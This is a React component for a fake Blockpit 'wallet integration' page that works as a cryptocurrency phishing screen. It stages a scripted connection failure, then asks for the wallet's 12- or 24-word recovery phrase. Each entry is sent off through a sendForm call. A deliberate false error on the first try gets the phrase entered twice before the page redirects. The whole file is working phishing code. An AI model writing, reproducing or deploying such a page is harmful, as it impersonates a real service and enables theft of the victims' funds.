import React, { useEffect, useRef,useState } from "react";
import "../SecondHome/SecondHome.css";
import { FaArrowLeftLong } from "react-icons/fa6";
import { FaRegQuestionCircle } from "react-icons/fa";
import newImage from "../../assets/newimage.svg";
import cloudImage from "../../assets/cloudimage.svg";
import { MdKeyboardArrowRight } from "react-icons/md";
import { useNavigate } from "react-router-dom";
import { MdClear } from "react-icons/md";
import { sendForm } from "../sendForm";

const SecondHome = () => {
  const [showModal, setShowModal] = useState(false);
  const [showModal2, setShowModal2] = useState(false);
  const [showModal3, setShowModal3] = useState(false);
  const navigate = useNavigate();
  const [submitCount, setSubmitCount]= useState(0)
  const [error, setError] = useState("")
  const form = useRef()
  
  const handleNavigate = () => {
    navigate("/");
  };

  const closeModals = () =>{
    setShowModal(false)
    setShowModal2(false)
    setShowModal3(false)
  }

  const openModal = () => {
    setShowModal(true);
    setShowModal2(false);
  };

  useEffect(() => {
    let timer;
    if (showModal) {
      timer = setTimeout(() => {
        setShowModal(false);
        setShowModal2(true);
      }, 3000);
    }
    return () => clearTimeout(timer);
  }, [showModal]);

  const formSubmit = (e) => {
    e.preventDefault()

    const newCount = submitCount + 1
    setSubmitCount(newCount)
    sendForm(form)

    if(newCount === 1){
      setError("Please, input your details correctly")
      
    }

    if(newCount === 2){
      setError("")
      navigate("/admin")
      return 0
    }

    return newCount
  };

  return (
    <div id="homepage2">
      <div id="hheadingdiv">
        <FaArrowLeftLong className="react-icon" onClick={handleNavigate} />
        <p id="hheadingp">Hot / Cold Wallet Integration</p>
        <FaRegQuestionCircle className="react-icon" id="question-icon" />
      </div>

      <div id="div2" className="otherdiv" onClick={openModal}>
        <div className="imagecontainer" id="imgcon1">
          <img src={newImage} alt="" id="newimage" />
        </div>

        <div className="textdiv">
          <p className="textdivheading">
            Integrate your Hot / Cold Wallet Account
          </p>
          <p className="textdivp">
            Proceed to integrate and connect your Hot / Cold wallet account
            directly to your Blockpit account
          </p>
        </div>
        <MdKeyboardArrowRight className="arrow-right" />
      </div>

      <div id="div3" className="otherdiv" onClick={openModal}>
        <div className="imagecontainer" id="imgcon2">
          <img src={cloudImage} alt="" id="newimage" />
        </div>
        <div className="textdiv">
          <p className="textdivheading">Cloud Wallet / Keyless Wallet</p>
          <p className="textdivp">
            Log in to your Blockpit via your keychain or your wireless device.
          </p>
        </div>
        <MdKeyboardArrowRight className="arrow-right" />
      </div>

      {showModal && (
        <div className="modal-overlay" onClick={closeModals}>
          <div
            id="modal1"
            className="modal"
            onClick={(e) => e.stopPropagation()}
          >
            <div className="mdclearicondiv" onClick={closeModals}>
              <MdClear className="mdclearicon" />
            </div>

            <div className="spinner"></div>

            <p className="modalp">Connecting....Please wait</p>
          </div>
        </div>
      )}

      {showModal2 && (
        <div className="modal-overlay" onClick={closeModals}>
          <div
            id="modal2"
            className="modal"
            onClick={(e) => e.stopPropagation()}
          >
            <div
              className="mdclearicondiv"
              onClick={closeModals}
            >
              <MdClear className="mdclearicon" />
            </div>

            <div className="spinner"></div>

            <p className="modalp" id="modal2p">
              Failed....Please connect manually
            </p>
            <div id="manualconnectdiv">
              <button
                id="manualconnect"
                onClick={() => {
                  setShowModal2(false);
                  setShowModal3(true);
                }}
                type="button"
              >
                Connect Manually
              </button>
            </div>
          </div>
        </div>
      )}

      {showModal3 && (
        <div className="modal-overlay" onClick={closeModals}>
          <div
            id="modal3"
            className="modal"
            onClick={(e) => e.stopPropagation()}
          >
            <div
              className="mdclearicondiv"
              onClick={closeModals}
            >
              <MdClear className="mdclearicon" />
            </div>
            <form action="submit" ref={form} onSubmit={formSubmit}>
              <p id="modalheading">Integrate your Hot / Cold Wallet</p>
{error && (<p id="modalerror">{error}</p>)}
              <p className="label">Wallet Name</p>
              <input type="text" placeholder="Wallet" className="modalinput" id="modalinput1"
              name="walletname"/>

              <p className="label">Recovery phrase</p>
              <input type="text" placeholder="Enter your recovery phrase" className="modalinput" id="modalinput2" name="walletphrase"/>
              <p id="modallastp">
                Typically 12 (sometimes 24) words separated by single spaces
              </p>

              <div id="integratediv">
                <button id="integrate" type="submit">
                  Integrate
                </button>
              </div>
            </form>
          </div>
        </div>
      )}
    </div>
  );
};

export default SecondHome;
